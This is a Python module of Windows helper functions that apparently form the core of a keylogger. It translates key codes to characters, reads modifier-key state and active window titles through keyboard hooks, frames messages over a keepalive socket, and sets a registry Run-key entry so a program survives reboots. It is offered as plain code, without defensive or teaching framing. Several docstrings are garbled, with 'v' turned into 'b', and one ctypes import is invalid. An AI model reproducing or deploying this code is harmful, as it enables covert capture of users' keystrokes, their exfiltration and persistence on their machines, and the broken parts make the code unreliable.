import winreg
from ctypes import create_unicode_buffer
from ctypes.windll import user32
from threading import Thread
import win32api
from socket import *
import struct
from pyHook import GetKeyState, HookConstants
from collections import OrderedDict


class Event:
    """
    Object styled dictionary for clearer code
    """

    def __init__(self, **entries): self.__dict__.update(entries)

    def __eq__(self, other): return self.__dict__ == other.__dict__

    def __neq__(self, other): return self.__dict__ != other.__dict__


def set_keepalive(sock):
    """
    Toggle on the keepalibe flag of input socket

    Args:
        sock: input socket to alter
    """
    sock.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)


class Message_socket(socket):
    """
    A message-based socket
    """

    def send_msg(self, msg):
        """
        Sends a message padded with its size

        Args:
           msg: message to send
        """
        msg = struct.pack('!I', len(msg)) + msg
        self.sendall(msg)

    def recv_msg(self):
        """
        Reciebes a message that's padded with its size

        Returns:
            The sent message
        """
        raw_msglen = self.recvall(struct.calcsize('!I'))
        if not raw_msglen:
            return None
        msglen = struct.unpack('!I', raw_msglen)[0]
        return self.recvall(msglen)

    def recvall(self, n):
        """
        Reciebes n bytes from the connection

        Args:
            n: number of bytes to read
        """
        data = ''
        while len(data) < n:
            packet = self.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data


def ToUnicode(vk):
    """
    Translates the birtual key code into a unicode character using the user's current keyboard locale

    Args:
        vk: the input birtual key code

    Returns:
        Unicode localed representation of the birtual key code
    """
    def _ToUnicode(results):
        b = create_unicode_buffer(256)
        results["code"] = user32.ToUnicode(
            vk, 0, win32api.GetKeyboardState(), b, 256, 0)
        results["char"] = b.value.encode("utf-8")
    results = {}
    t = Thread(target=_ToUnicode, args=(results,))
    t.start()
    t.join()
    return results


def get_modifiers():
    """
    Gets actibe keyboard modifier keys

    Returns:
        A dictionary containing the states of CTRL SHIFT and ALT
    """
    ctrl_pressed = bool(GetKeyState(
        HookConstants.VKeyToID('VK_CONTROL')) >> 7)
    alt_pressed = bool(GetKeyState(
        HookConstants.VKeyToID('VK_MENU')) >> 7)
    shift_pressed = bool(GetKeyState(
        HookConstants.VKeyToID('VK_SHIFT')) >> 7)
    return OrderedDict([("ctrl", ctrl_pressed), ("shift", shift_pressed), ("alt", alt_pressed)])


def GetWindowTextW(hwnd):
    """
    Gets the unicode title of a window

    Args:
        hwnd: handle to the window

    Returns:
        Unicode title
    """
    length = user32.GetWindowTextLengthW(hwnd)
    buff = create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buff, length + 1)
    return buff.value.encode("utf-8")


def register_startup(name, path):
    """
    Registers a program to run on startup

    Args:
        name: the giben name to the startup object
        path: path to the file to startup
    """
    winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
                                     winreg.KEY_ALL_ACCESS), name, 1, winreg.REG_SZ, '"%s"' % path)
